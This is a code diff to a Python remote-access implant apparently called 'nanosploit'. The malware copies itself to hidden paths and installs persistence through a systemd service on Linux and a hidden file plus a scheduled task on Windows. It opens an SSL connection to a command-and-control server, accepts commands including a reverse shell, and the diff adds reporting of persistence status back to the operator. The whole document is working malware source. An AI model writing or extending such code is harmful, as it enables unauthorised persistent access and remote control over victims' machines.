@@ -312,7 +312,7 @@ def create_systemd_service(home_path: str):
     print("Successfully set systemd service !")
 
 
-def persistence_linux():
+def persistence_linux(persistence: dict):
     home_path = os.getenv("HOME")
     payload_path = f"{home_path}/.nanosploit"
 
@@ -321,7 +321,11 @@ def persistence_linux():
         os.system(f"cp {__file__} {payload_path}")
 
     # Run persistence
-    create_systemd_service(home_path)
+    try:
+        create_systemd_service(home_path)
+        persistence["systemd_service"] = "OK"
+    except:
+        persistence["systemd_service"] = "KO"
 
 
 def create_scheduled_task(payload_path: str):
@@ -339,14 +343,19 @@ def create_scheduled_task(payload_path: str):
     return True
 
 
-def persistence_windows():
+def persistence_windows(persistence: dict):
     payload_path = f"C:/Users/{os.getlogin()}/AppData/Local/Temp/nanosploit"
 
     if not os.path.exists(payload_path):
         copyfile(__file__, payload_path)
         os.system(f"attrib +h {payload_path}")
 
-    create_scheduled_task(payload_path)
+    # Run persistence
+    try:
+        create_scheduled_task(payload_path)
+        persistence["scheduled_task"] = "OK"
+    except:
+        persistence["scheduled_task"] = "KO"
 
 
 ''' REVERSE SHELL '''
@@ -402,7 +411,7 @@ def init_connection() -> ssl.SSLSocket:
     return ss
 
 
-def process_instructions(ss: ssl.SSLSocket):
+def process_instructions(ss: ssl.SSLSocket, persistence: dict):
     while True:
         buffer = ss.recv()
         if buffer:
@@ -414,8 +423,7 @@ def process_instructions(ss: ssl.SSLSocket):
                 case b"shell":
                     reverse_shell(ss)
                 case b"persistence":
-                    # TODO: return persistence status
-                    pass
+                    ss.send(persistence.__str__().encode())
                 case b"exists":
                     if os.path.isfile(buffer.split(b" ")[1]):
                         ss.send(b"ok")
@@ -448,11 +456,12 @@ def main():
     print("Lock is free !")
 
     # Persistence
+    persistence = {}
     print("Start persistence...")
     if platform.system() == "Linux":
-        persistence_linux()
+        persistence_linux(persistence)
     elif platform.system() == "Windows":
-        persistence_windows()
+        persistence_windows(persistence)
     print("Finished persistence !")
 
     # Start secure connection with C2
@@ -461,7 +470,7 @@ def main():
 
     # Handle server commands
     print("Start listening for server instructions...")
-    process_instructions(ss)
+    process_instructions(ss, persistence)
 
     # Exit program and delete lock file
     os.system(f"rm {LOCK_PATH}")
